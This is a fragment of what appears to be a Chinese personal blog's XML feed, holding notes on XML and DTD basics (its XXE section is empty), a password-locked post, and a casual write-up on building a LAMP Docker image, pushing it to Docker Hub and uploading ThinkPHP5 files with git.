class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget me this weekend!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><strong>XML由七种组成元素构成</strong>（老版本）</p><ul><li>文档的声明</li><li>元素</li><li>属性</li><li>注释</li><li>实体字符，如<ul><li><code>&amp;lt;</code>表示<code>&lt;</code></li><li><code>&amp;gt;</code>表示<code>&gt;</code></li><li><code>&amp;amp;</code>表示<code>&amp;</code></li><li><code>&amp;apos;</code>表示<code>&#39;</code></li><li><code>&amp;quot;</code>表示<code>&quot;</code></li></ul></li><li>字符数据区 [!CDATA[内容]]</li><li>处理指令</li></ul><br><p>关于学习的资料可参考：<font color="#00B2EE">[<a href="http://www.runoob.com/xml/xml-tutorial.html" target="_blank" rel="noopener">XML 教程</a>]</font>、<font color="#00B2EE">[<a href="https://www.cnblogs.com/jb8164/articles/736515.html" target="_blank" rel="noopener">XML 文档结构简介（一）</a>]</font>、<font color="#00B2EE">[<a href="https://blog.csdn.net/RookiexiaoMu_a/article/details/89193062" target="_blank" rel="noopener">XML</a>]</font>、<font color="#00B2EE">[<a href="https://blog.csdn.net/weixin_37641832/article/details/89219411" target="_blank" rel="noopener">XML</a>]</font></p><p>下面是我的一些关于学习XML的笔记😁(●ˇ∀ˇ●)</p><div class="article-img"><p><img src="https://i.loli.net/2019/04/20/5cb9fc94b9af6.jpg" alt="201.jpg" data-zoomable></p></div><div class="article-img"><p><img src="https://i.loli.net/2019/04/20/5cb9fc94bf2ac.jpg" alt="202.jpg" data-zoomable></p></div><div class="article-img"><p><img src="https://i.loli.net/2019/04/20/5cb9fc94af924.jpg" alt="203.jpg" data-zoomable></p></div><div class="article-img"><p><img src="https://i.loli.net/2019/04/20/5cb9fc94886b8.jpg" alt="204.jpg" data-zoomable></p></div><div class="article-img"><p><img src="https://i.loli.net/2019/04/20/5cb9fc94ac31a.jpg" alt="205.jpg" data-zoomable></p></div><p><br><br><br></p><h3 id="二-DTD"><font color="#FF6347" face="Comic sans MS">二. DTD</font><a href="post/xxe-xml-dtd#二-DTD"></a></h3><h4 id="2-1-基本概念"><font color="#3CB371" face="Comic sans MS">2.1 基本概念</font><a href="post/xxe-xml-dtd#2-1-基本概念"></a></h4><p>DTD为英文(Document Type Definition)，中文意思为“文档类型定义”。</p><p>DTD肩负着两重任务：一方面它帮助你编写合法的代码，另一方面它让浏览器正确地显示器代码。</p><p>DTD扮演着很重要的角色，会使代码变得规范性，打个比方：</p><blockquote><p>良好的xml文档：符合xml的语法规则。<br>有效的xml文档：符合xml语法规则的同时还需要符合DTD文档类型定义。<br>利用DTD可以对xml文档的各个节点进行约束定义，使开发遵循一套“标准”。<br>DTD可以约束xml文档出现的元素，元素名称，元素的先后顺序，属性等。</p></blockquote><p>推荐参考：<font color="#00B2EE">[<a href="https://blog.csdn.net/wff900703/article/details/80457635" target="_blank" rel="noopener">XML中的DTD是什么？</a>]</font>、<font color="#00B2EE">[<a href="https://blog.csdn.net/sinat_32366329/article/details/80188837" target="_blank" rel="noopener">XML之自定义DTD约束</a>]</font>、<font color="#00B2EE">[<a href="https://blog.csdn.net/Yeoman92/article/details/53055749" target="_blank" rel="noopener">XML中DTD介绍及使用</a>]</font></p><br><h4 id="2-2-使用DTD"><font color="#3CB371" face="Comic sans MS">2.2 使用DTD</font><a href="post/xxe-xml-dtd#2-2-使用DTD"></a></h4><p><br><br></p><h3 id="三-XXE漏洞"><font color="#FF6347" face="Comic sans MS">三. XXE漏洞</font><a href="post/xxe-xml-dtd#三-XXE漏洞"></a></h3>]]></content>
      
      
      <categories>
          
          <category> XXE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
            <tag> XML </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>台儿庄古镇</title>
      <link href="/post/ancientcityoftaierzhaung/"/>
      <url>/post/ancientcityoftaierzhaung/</url>
      
        <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Welcome to my blog, enter password to read." />    <label for="pass">Welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>闲谈Docker😄</title>
      <link href="/post/docker-github/"/>
      <url>/post/docker-github/</url>
      
        <content type="html"><![CDATA[<p>闲谈一下Docker….</p><a id="more"></a><br><h3 id="一-´･･-ﾉ"><font color="#FF6347" face="Comic sans MS">一. ( ´･･)ﾉ(._.`)</font><a href="post/docker-github#一-´･･-ﾉ"></a></h3><p><strong>一</strong><br>有好些时日没有更新了，但这并不意味着我没学习😭，很喜欢学习技术方面的东西😒。嗯，真好玩，原来学习这些东西是真的好玩。比如说学些SQL注入的小东西，无论是手工亦或是借助一些工具。XSS玩玩也挺不错的，还有就是隐写逼格好高哦…..内网渗透可真是无孔不入….等等….我都觉得挺有意思。</p><p>但是无奈(  ᵒ̴̶̷̥́ _ᵒ̴̶̷̣̥̀  )，就目前来说没有这么多时间去搞这些了😔…..</p><p>但是，我是绝对不会停下脚步滴。今天复习到下午就开始有些无聊了，难道？嗯，是的，我的课程设计还没搞好呢，正好可以转移注意力去搞搞项目(๑╹︎ڡ╹︎๑)⃛，也好放松一下,毕竟Docker和ThinkPHP5还没学完呢，那就开始搞吧…..</p><p><strong>二</strong><br>曾经听说过这样一句话：一项技术兴起并有可能占有重要地位时，我们应该尽早去学习掌握它，因为早开始就意味着早成才。<br>无论学什么都应该始终保持一颗对求知充满欲望的心，我比较喜欢电影《功夫熊猫2》里的一句台词：Your story may not have a such happy begining, but that doesn’t make who you are. It is the rest of your story, who you choose to be. （你人生故事的开头也许充满坎坷，不过这并不影响你成为什么样的人。关键看你后来的人生路，你自己选择怎么走下去。）</p><p>我一直都对那些存有高度自律能力的人充满敬仰，对大多数成年人来说惰性始终是一生之敌。我也时常在思考一个问题，一个人做一件事做多久才能称得上坚持？现在我也终于明白，原来被叫做坚持的这种东西它本身是不具有方向性的或者说它对于每个不同的人来说都有特殊的意义，只要认为是值得就坚持得有意义。</p><p>所以我得出这样一个结论：一定要找到一个理由来支撑坚持，无论是一个目标还是心中强大的欲望。因为放弃太简单了，一个简单的想法就可以让自己放弃。这个理由也有可能是一生所求吧….</p><p><strong>三</strong><br>好了，扯淡也差不多了。还是回来再看看最近遇到的问题，也好写个总结，方便以后自己再次查阅能够方便些。</p><br><h3 id="二-Docker、Github文件部署"><font color="#FF6347" face="Comic sans MS">二. Docker、Github文件部署</font><a href="post/docker-github#二-Docker、Github文件部署"></a></h3><h4 id="2-1-关于我的Docker"><font color="#3CB371" face="Comic sans MS">2.1 关于我的Docker</font><a href="post/docker-github#2-1-关于我的Docker"></a></h4><p><strong>一、Web服务器已经完成的工作</strong><br>截至2019.4.1号，我在docker里装了一个ubuntu，ubuntu里搭了一个Web服务器（Apache2+mysql+php7.2）。</p><p><strong>结构</strong>：<br>ubuntu18.04（1）<br>│<br>├─ ubuntu18.04（2）<br>│    ├─ apache2<br>│    ├─ mysql<br>│    ├─ php7.2</p><p>apache2对外目录<code>/var/www/html</code></p><ol><li><code>docker ps -a</code> （已经将apache280端口映射到ubuntu18.04（1）的90端口）列出</li></ol><p>CONTAINER<br> ID |IMAGE|COMMAND|CREATED|STATUS |PORTS | NAMES<br>:-:|:-|:-|:-|:-|<br>7b8832c95393|0517335286ae|”/bin/bash”|9 days ago |Exited (0) <br>3 hours ago|   | webtest<br>83a664e24ae4|ubuntu|”/bin/bash”|10 days ago|Exited (0) <br>9 days ago||ubuntu-web</p><ol start="2"><li><code>docker start -i 7b8832c95393</code> 进入ubuntu，<code>ls</code>，<code>cat uplogs</code></li></ol><ul><li>在主目录下建立了service.sh脚本，目的是启动apache2和mysql服务器；一定要给脚本文足够的权限，否则脚本运行不了。</li><li>在主目录下建立了uplogs.txt文件，目的是记录容器的更新；</li><li>在 /var/www/html建立test1.php文件，内容为：</li></ul><pre class="line-numbers language-php"><code class="language-php">     <span class="token delimiter">&lt;?php</span>      <span class="token keyword">echo</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>   但是在客户机浏览器看到显示为空，上网查了一下，需要修改PHP配置，如下：<br>   vim /etc/php/7.2/apache2/php.ini   修改PHP配置信息将short_open_tags=on；<br>   参考链接： <a href="https://www.cnblogs.com/smallrookie/p/5635814.html" target="_blank" rel="noopener">https://www.cnblogs.com/smallrookie/p/5635814.html</a> </p><p><strong>二、将建立好的容器转为镜像并部署到 Dockerhub</strong></p><ol><li>容器转成镜像<ol><li><code>dock kill &lt;containerID&gt;</code> 停止要转换的容器；</li><li><code>docker commit -a &quot;Alvin-Web&quot; -m &quot;my webserver&quot; 83a664e24ae4 apachemysql/php7.2:v1.2</code><ul><li><code>-a</code> 是取作者名字</li><li><code>-m</code> 是给这个镜像取一个名字</li><li><code>83a664e24ae4</code> 容器ID</li><li><code>apache/php7.2</code> 镜像仓库名</li><li><code>:v1.0</code> 镜像的<code>tag</code>是<code>v1.0</code><br>完整命令<code>docker commit -a &quot;xxxx&quot; -m &quot;xxx&quot; &lt;containerID&gt;  镜像仓库名xx:tag名x</code></li></ul></li></ol></li><li>将转换好的镜像部署到Dockerhub<ol><li>在Dockerhub建立一个Repositories。我的是<code>webservice-apache2-mysql-php7.2</code>，我的用户名是<code>treecat</code>，则全名是<code>treecat/webservice-apache2-mysql-php7.2</code></li><li><code>docker login</code> 登陆远程仓库</li><li>将本地要部署的镜像仓库名必须改为和远程<code>webservice-apache2-mysql-php7.2</code>一样 ----&gt;<br><code>docker tag apachemysql/php7.2:v1.2 treecat/webservice-apache2-mysql-php7.2:v1.2</code></li><li>部署 <code>docker push treecat/webservice-apache2-mysql-php7.2:v1.2</code></li></ol></li></ol><div class="article-img"><p><img src="https://i.loli.net/2019/04/02/5ca244ed60683.png" alt="1.png" data-zoomable></p></div><p><strong>三、准备在ubuntu18.04（2）里装ThinkPHP5</strong></p><p><strong>注意</strong>：安装ThinkPHP5只需要在Apache2或者其他服务器的根目录下放tp5这个文件夹就好了。<br>特别需要注意的是，我在win10系统然后进入ThinkPHP官网下载的文件拿到Ubuntu下面来用老是不行，按照跨平台性和理论性来说无论在哪一个系统下面都能用。下面做了些探索，但是最后的解决方法是：在Ubuntu系统下到<a href="http://www.thinkphp.cn/" target="_blank" rel="noopener">官网</a>下载<a href="http://www.thinkphp.cn/donate/download/id/1278.html" target="_blank" rel="noopener">ThinkPHP5.0.24完整版</a>，然后用Docker命令将本地文件复制到容器里面，注意我这里没有复制到镜像，命令参考：</p><pre class="line-numbers language-ubuntu"><code class="language-ubuntu">docker cp 本地文件的路径（绝对路径） 容器ID:容器中存放该文件的路径位置   docker cp /opt/etc/lampp/htdocs/tp5 7862sc25dsc1:/var/www/html/ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><br> 实际方法参考上述即可，下面是我初期安装ThinkPHP5的探索，也是可以安装的，如果不想麻烦可略过….</p><ol><li>本来想的挺好的在里面装个ThinkPHP5就直接用了，无奈<code>composer.phar</code>都已经安装好了，但是如下的错误始终无法解决： </li></ol><pre class="line-numbers language-linux"><code class="language-linux">root@7b8832c95393:/var/www/html# sudo composer create-project topthink/thinkphp tp5bash: sudo: command not found<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-linux"><code class="language-linux">root@7b8832c95393:/var/www/html# composer create-project topthink/thinkphp tp5Do not run Composer as root/super user! See https://getcomposer.org/root for details<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>docker里面的ubuntu不能用<code>sudo</code>因为自身就是root了，我不想建立用户组，管理有些麻烦；</p><ol start="2"><li>第二个问题就是<code>Do not run Composer as root/super user! See https://getcomposer.org/root for details</code>，根据报错知道不能直接用root或者超级用户，网上找了些方法都是建立用户组的用户就好了。但是后来没办法我确实建立了一个用户组和一个用户，然后本以为这样就可以了，然后我就去安装TP5了，没想到报错说是没有cache….算了，是在没时间去搞这些花里胡哨的了。</li><li>我仔细一想不就是在<code>/war/www/html</code>下装个ThinkPHP5么，而且它本身就是文件夹和文件。简单啊，我先将这个文件夹放到我的Github，然后直接用ubuntu18.04（2）从我的github仓库<code>git clone</code>就好了呀….说干就干。无奈如果直接在github仓库直接<code>Upload files</code>的话，每次上传的文件个数有要求，所以我就想到了用<strong>Git</strong>啊，命令行直接干上去….<br>又是说干就干，不过成功了！（本地文件部署到Github）哈哈哈，往下看我是怎么将本地文件上传到我的Github仓库的，之前只是部署博客倒是挺溜的，这次终于有机会上传文件玩玩了….</li><li>但是，但是，但是就这样把自己的tp5放到ubuntu18.04（2）的<code>/var/www/html</code>下面的话，使用<code>localhost/tp5/public</code>根本访问不了，我知道依赖和配置这些都没弄好，实在不想自己再去搞了，直接去github下载人家官方维护的不好么？真的是傻….教程参考[<a href="https://blog.csdn.net/weixin_43741381/article/details/84778706" target="_blank" rel="noopener">如何使用Git安装ThinkPHP5</a>]<br>这下就在ubuntu18.04（1）---&gt;docker---&gt;ubuntu18.04（2）---&gt;<code>/car/www/html</code>下装好了thinkphp5.1<br>装好后访问 <code>localhost:90/think_git/public/index.php</code> 是这样滴…..</li></ol><div class="article-img"><p><img src="https://i.loli.net/2019/04/02/5ca300d485ace.png" alt="4.png" data-zoomable></p></div><h4 id="2-2-将本地文件部署到Github"><font color="#3CB371" face="Comic sans MS">2.2 将本地文件部署到Github</font><a href="post/docker-github#2-2-将本地文件部署到Github"></a></h4><p><strong>一. 建立本地仓库</strong></p><blockquote><ul><li>准备本地仓库</li><li><code>git init</code></li><li><code>git add .</code></li><li><code>git commit -m &quot;注释内容&quot;</code></li></ul></blockquote><ol><li>建立需要部署的文件夹或者准备好需要部署的文件夹（作为本地仓库）；</li><li>在文件夹里面执行<code>git init</code>初始化本地仓库，初始化成功后你会发现项目里多了一个隐藏文件夹.git；</li><li>执行指令<code>git add .</code>将所有文件添加到仓库；（注意空格和点不要忘了）这时可以使用命令<code>git status</code>查询文件有哪些修改了（修改的文件显示为红色）</li><li>执行指令<code>git commit -m &quot;注释内容&quot;</code>双引号内是提交注释（不要忘记双引号）。</li></ol><p><strong>二. 建立远程仓库并部署</strong></p><blockquote><ul><li>准备远程仓库</li><li><code>git remote add origin git@github.com:Directoree/thinkphp5.git</code></li><li><code>git pull --rebase origin master</code></li><li><code>git push -u origin 